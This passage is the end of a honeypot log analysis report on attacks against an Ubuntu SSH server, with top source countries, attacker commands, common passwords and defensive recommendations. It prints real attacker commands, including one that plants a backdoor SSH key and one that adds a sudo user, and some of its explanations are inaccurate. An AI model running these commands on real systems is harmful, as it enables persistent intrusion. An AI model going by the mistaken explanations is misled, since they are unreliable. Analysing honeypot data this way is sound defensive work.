logs the most used hash was “a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2” which is a <strong>Backdoor OpenSSH public key </strong>to access the ubuntu server. The most connection access based on countries were China, US, India, Russia, and Japan. China had more than 150k connections which is more the other US, India, Russia and Japan combined. </p><p id="f5a50d01-4e25-46bc-8526-1cf776e80224" class="">The most used Source IP was 112.90.182.230, with 60.8% usage with port 23456 being used the most. After a bit of research, port 23456 is used for Trojans/backdoors. The three types of trojans are Evil FTP, Ugly FTP, and WhackJob. Evil FTP refers to malicious FTP servers or clients used by attackers to transfer files illicitly. &quot;Evil FTP&quot; could be employed in cyber attacks to exfiltrate data from compromised systems or to distribute malware. Ugly FTP refers to poorly implemented or insecure FTP servers or clients that have vulnerabilities. &quot;Ugly FTP&quot; might not follow best practices for security, making them easy targets for exploitation. WhackJob refers to an unconventional or erratic tool or method used in file transfers or cyber attacks. It might indicate something irregular or unorthodox in how files are handled or transferred.</p><p id="4f287ac1-0b28-4684-96d5-10ed91ac4304" class="">
+</p><p id="bdcfc72d-d1a7-43dd-8e8e-cf21a0b12fba" class="">Here are the inputs contained in the hash </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="564da721-5249-436e-b2a7-f832dbac5848" class="code"><code class="language-Bash">cd ~ &amp;&amp; rm -rf .ssh &amp;&amp; mkdir .ssh &amp;&amp; echo 
+&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5
+O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9e
+LBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQH
+md1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5Pm
+Uux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr&quot;&gt;&gt;.ssh/authorized_keys &amp;&amp; 
+chmod -R go= ~/.ssh &amp;&amp; cd ~
+
+cd ~; chattr -ia .ssh; lockr -ia .ssh
+
+lockr -ia .ssh</code></pre><ul id="69d4788b-2468-4970-86b6-c8ce99bc85fa" class="bulleted-list"><li style="list-style-type:disc">The first command: The script sets up an SSH key for passwordless login by adding it to the <code>authorized_keys</code> file. Then, it ensures the ‘<strong>.ssh” </strong>directory is secured by adjusting permissions and possibly changing file attributes to prevent unauthorized modifications. </li></ul><ul id="f4a22773-a5a2-40e0-a82e-6344c71feb87" class="bulleted-list"><li style="list-style-type:disc">The second command: navigates to the root directory, then <code>chattr -ia .ssh</code> removes both the immutable and append-only attributes from the <code>.ssh</code> directory, allowing for modifications to its contents, such as adding or deleting files within it. The third part of the command uses locker, which is an SSH key management program.    <code>lockr -ia .ssh</code><br/><br/></li></ul><hr id="9b63ccc4-edda-4bbe-b8c8-9969bc82a0d8"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="89a0962c-6507-49ee-9ab5-032e97b55d72" class="code"><code class="language-Bash">busybox dd if=$SHELL bs=22 count=1||dd if=/proc/self/exe bs=22 count=1||
+while read i;do busybox echo -n $i;done&lt;/proc/self/exe||cat /proc/self/exe</code></pre><p id="05ac3bb9-1177-4bc2-8d49-81138a0130bf" class="">Attackers use this command to read outputs and copy them to the “/proc/self/exe” directory by trying multiple commands, hence the use of “OR” for fallback methods. </p><p id="56d335da-6498-43ff-b1f1-cc07fd364c2a" class="">Usually, attackers pair this command with scripts to ensure their malware/payload could retrieve part of its binary data, even if the data is restricted or monitored.</p><p id="c217c5ce-d326-4f05-8ff2-fd099be858c7" class="">
+</p><hr id="4ad855ef-7fa1-48a1-afc2-f3b3080d0dd0"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3a9aebbe-7bdf-40fd-892a-d19c761e58ae" class="code"><code class="language-Bash">apt update &amp;&amp; apt install sudo curl -y &amp;&amp; sudo useradd -m -p 
+$(openssl passwd -1 2wnwKBvm) system &amp;&amp; sudo usermod -aG sudo system</code></pre><p id="e4a95d48-3896-454e-a702-94f001aea6a1" class="">Based on these commands, the attacker seemed to have tried to create a new user and give it administrative privileges. </p><hr id="2da042a0-8087-46f8-9687-663372494bc0"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0cc38cf4-f655-480c-88dd-6b216ff5090b" class="code"><code class="language-Bash">ps | grep &#x27;[Mm]iner&#x27;
+ps -ef | grep &#x27;[Mm]iner&#x27;</code></pre><p id="126802a5-e725-47ee-bc76-b49b83fba5d7" class="">The attacker tried to look for crypto miners to possibly cryptojack it. Botnet mostly runs these commands. </p><hr id="7c7a4b68-8e12-4f05-a8a8-ecde81e8b3db"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5d0dd8be-b1f8-4861-a539-4423b0b2685a" class="code"><code class="language-Bash">mount -o remount,rw,exec /usr/; 
+&gt;/usr/.a &amp;&amp; cd /usr/;
+(/bin/busybox echo -e &quot;\x44\x49\x52&quot;||echo -e &quot;\x44\x49\x52&quot;)</code></pre><p id="4c9dc174-402c-4805-ab83-a2de45bcc413" class="">The attacker tries to remount the /usr/ directory with read-write and execute privileges. This could be to access the directory and output data from it. In addition, the attacker tries to execute shell command with use of “\x44\x49\x52\” which translates to DIR from Hex. This could be for data manipulation or Exfiltration to modify and retrieve files from the usr directory. </p><p id="ee820746-e67f-4235-b642-bb69dbf907a9" class="">
+</p><p id="7d338e15-16a7-4f63-865c-d44becbc56d6" class="">Many commands similar to this tried to manipulate Data, Exfiltrate Data, or persist data on different directories on the server.  </p><hr id="9081b389-bf99-4cc7-a89f-7f3f7aa946ef"/><p id="f0351d07-2d22-46d5-b369-907374ae8e69" class="">
+</p><p id="cde9fb23-037c-4b4c-ac55-e28996856c96" class="">The top 5 most used passwords were:</p><table id="15c914e7-0c85-431f-bab6-8f29b5f1ac25" class="simple-table"><tbody><tr id="effb016a-1c1f-4e7b-8f5a-73d319d059c7"><td id="tp=d" class=""><strong>Top 5 Passwords</strong></td><td id="G{&gt;&gt;" class=""><strong>Count</strong></td><td id="Z`Hu" class=""><mark class="highlight-default"><strong>%</strong></mark></td></tr><tr id="69715477-34af-471e-91e2-5a7f3215d5ed"><td id="tp=d" class="">3245gs5662d34</td><td id="G{&gt;&gt;" class="">1,112</td><td id="Z`Hu" class="">4.17%</td></tr><tr id="560a4f8e-8feb-47fb-b26c-22d7dcb616cd"><td id="tp=d" class="">345gs5662d34</td><td id="G{&gt;&gt;" class="">1,110</td><td id="Z`Hu" class="">4.162%</td></tr><tr id="0c0c0207-6cd2-44ac-bf16-b6e56c65c57e"><td id="tp=d" class="">123456</td><td id="G{&gt;&gt;" class="">838</td><td id="Z`Hu" class="">3.142%</td></tr><tr id="4d002ca2-3748-4b33-beb5-777403b5f476"><td id="tp=d" class="">admin</td><td id="G{&gt;&gt;" class="">554</td><td id="Z`Hu" class="">2.077%</td></tr><tr id="11aae8dd-4ab0-47bb-91e8-9ad162b604ae"><td id="tp=d" class="">xc3511</td><td id="G{&gt;&gt;" class="">384</td><td id="Z`Hu" class="">1.44%</td></tr></tbody></table><h2 id="292fe248-92ea-4279-9576-07999db3f82e" class="">5. Recommendations</h2><p id="8679dfef-8097-4d2c-b458-78079d77a5d8" class="">Restrict access for connections based on geographical location. For example, China, India, and Russia should be excluded to minimize potential attacks. Create strong passwords to prevent unauthorized access. Create firewall rules to disable unused ports and domains not used within the organization. Ensure that high-level admin privileges are limited for a single user and that file integrity and permissions are managed correctly. Constant monitoring of the server is done to find any suspicious activity, and this could include employing Intrusion Detection System to detect suspicious activity. </p><p id="5b420419-7b09-43a0-bca8-5cc1c328b719" class="">
+</p><p id="568a985a-6260-4d22-8867-37ee0ae0423a" class="">
+</p><p id="c983d72b-fc4d-4d51-a900-9356c27fd932" class="">
+</p><p id="13a215b8-ec23-4362-877f-8ef37a5acf57" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
